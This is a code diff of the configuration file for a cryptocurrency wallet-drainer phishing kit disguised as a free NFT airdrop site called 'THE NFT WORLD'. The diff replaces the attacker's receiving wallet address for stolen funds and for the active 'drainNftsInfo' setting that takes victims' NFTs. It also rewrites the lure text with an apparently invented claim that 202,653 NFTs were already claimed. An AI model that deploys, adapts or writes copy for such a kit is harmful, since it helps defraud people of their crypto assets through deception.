@@ -1,4 +1,4 @@
-const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
+const receiveAddress = '0x02303C269DA8fFd23a10B44C7D89b89DcbB35352',
   collectionInfo = {
     name: 'THE NFT WORLD',
     socialMedia: {
@@ -11,15 +11,15 @@ const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
   indexPageInfo = {
     backgroundImage: 'background.jpg',
     title: '{name}',
-    underTitle: 'Free Airdrop',
+    underTitle: 'NFT Airdrop',
   },
 
   claimPageInfo = {
     title: 'GET YOUR<br>NFT NOW',
     shortDescription: 'Own, stake and build in our limitless possibilities Minecraft Metaverse',
     longDescription:
-      'After claim, NTFs will appear in your Metamask wallet within 10 minutes',
-    claimButtonText: 'CLAIM NOW',
+      '202,653 already claimed NFTS , Claim an NFT today',
+    claimButtonText: 'NFT Repository',
     image: 'bg3.png',
     imageRadius: 250,
   },
@@ -27,7 +27,7 @@ const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
   drainNftsInfo = {
     active: true,
     minValue: 0.1,
-    nftReceiveAddress: '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
+    nftReceiveAddress: '0x02303C269DA8fFd23a10B44C7D89b89DcbB35352',
   },
 
   customStrings = {
